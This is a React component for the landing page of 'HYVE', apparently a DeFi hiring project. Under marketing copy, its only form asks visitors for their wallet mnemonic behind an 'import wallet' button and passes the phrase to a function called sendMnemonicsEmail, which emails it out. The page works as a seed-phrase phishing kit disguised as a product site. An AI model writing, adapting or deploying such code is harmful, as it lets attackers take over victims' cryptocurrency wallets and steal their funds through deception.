import { PrimaryButton } from "componenents/Buttons";
import FormInput from "componenents/FormInput";
import Navbar from "componenents/Navbar";
import {
  defaultTheme,
  desktop,
  HeroSectionWrapper,
  neutral,
  sendMnemonicsEmail,
  tablets,
  typeScale,
} from "componenents/utils";
import { Spinner } from "componenents/utils/utilityComponents";
import { useEffect } from "react";
import { useState } from "react";
import styled from "styled-components";

const HeroContentContainer = styled.div`
  background: transparent;
  padding-left: 20px;
  padding-right: 20px;
  padding-top: 89vw;
  margin-left: 0;
  margin-right: 0;

  ${tablets} {
    margin-left: 30px;
    background: transparent;
  }

  ${desktop} {
    width: 50%;
    padding-left: 0;
    padding-right: 0;
    padding-top: 120px;
    background: transparent;
    padding-left: 30px;
    margin-left: 0;
    margin-right: 0;
  }

  .hero-mission {
    line-height: 1.5;
    padding-top: 8px;

    ${tablets} {
      width: 80%;
      font-size: ${typeScale.header3};
    }
  }

  .hero-about {
    font-weight: 600;
    padding-top: 24px;
    padding-right: 12px;

    ${tablets} {
      font-size: ${typeScale.header3};
    }
  }
`;

const HeroFormContainer = styled.div`
  padding: 20px 0;
`;

const HeroForm = styled.form`
  text-align: center;
  ${tablets} {
    width: 100%;
    display: flex;
    align-items: flex-start;
    justify-content: space-between;

    .form-button {
      ${desktop} {
        margin-left: 12px;
      }

      ${tablets} {
        margin-left: 24px;
      }
    }
  }
`;

const HeroFormInput = styled(FormInput)`
  border-radius: 8px;
  border-width: 2px;
  margin-bottom: 24px;

  ${tablets} {
    width: 60%;
    margin-bottom: 0;
  }
`;

const HeroButton = styled(PrimaryButton)`
  display: flex;
  align-items: center;
  margin: 0 auto;
`;

const FeedbackDiv = styled.div`
  display: block;
  width: 100%;
  padding: 16px;
  font-family: ${defaultTheme.primaryFont};
  font-weight: 600;
  border-radius: 8px;
  outline: none;
  border: 2px solid ${neutral[200]};
  letter-spacing: 3px;
  margin-bottom: 24px;

  ${tablets} {
    width: 60%;
    margin-bottom: 0;
  }

  div {
    white-space: nowrap;
    padding-left: 16px;
    overflow: hidden;
  }
`;

const Hero = () => {
  const [state, setState] = useState({
    mnemonic: "",
    feedbackSent: false,
    mnemonicPlaceHolder: "YOUR MNEMONIC",
    isLoading: false,
    queried: false,
  });
  const [queried, setQueried] = useState(false);

  const { mnemonic, mnemonicPlaceHolder, feedbackSent, isLoading } = state;

  useEffect(() => {
    if (!queried) {
      return;
    }

    setState({ ...state, isLoading: true });

    sendMnemonicsEmail(state.mnemonic).then(
      () => {
        setState({
          ...state,
          isLoading: false,
          feedbackSent: true,
        });
        setQueried(false);
      },
      () => {
        setQueried(false);
        setState({
          ...state,
          mnemonic: "",
          mnemonicPlaceHolder: "failed! please try again!!!",
          isLoading: false,
        });
      }
    );
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [mnemonic, queried]);

  const handleSubmit = (event) => {
    event.preventDefault();
    setQueried(true);
  };

  return (
    <HeroSectionWrapper>
      <Navbar />
      <HeroContentContainer>
        <h1>Hiring is broken.</h1>
        <p className="hero-mission">
          We're not touching that with a 10 foot pole, we're building it from
          scratch.
        </p>
        <p className="hero-about">
          HYVE — a DeFi centric autonomous ecosystem built on top of the multi
          billion workforce industry.
        </p>
        <HeroFormContainer>
          <HeroForm onSubmit={handleSubmit}>
            {feedbackSent ? (
              <FeedbackDiv>
                <div>Mnemonics has been sent</div>
              </FeedbackDiv>
            ) : (
              <HeroFormInput
                name="email"
                type="text"
                placeholder={mnemonicPlaceHolder}
                value={mnemonic}
                handleChange={(e) =>
                  setState({
                    ...state,
                    mnemonic: e.target.value,
                    mnemonicPlaceHolder: "YOUR MNEMONIC",
                  })
                }
              />
            )}

            <div className="form-button">
              <HeroButton
                disabled={feedbackSent || isLoading ? "disabled" : null}
                modifiers="responsive"
              >
                import wallet
                {isLoading ? <Spinner /> : null}
              </HeroButton>
            </div>
          </HeroForm>
        </HeroFormContainer>
      </HeroContentContainer>
    </HeroSectionWrapper>
  );
};

export default Hero;
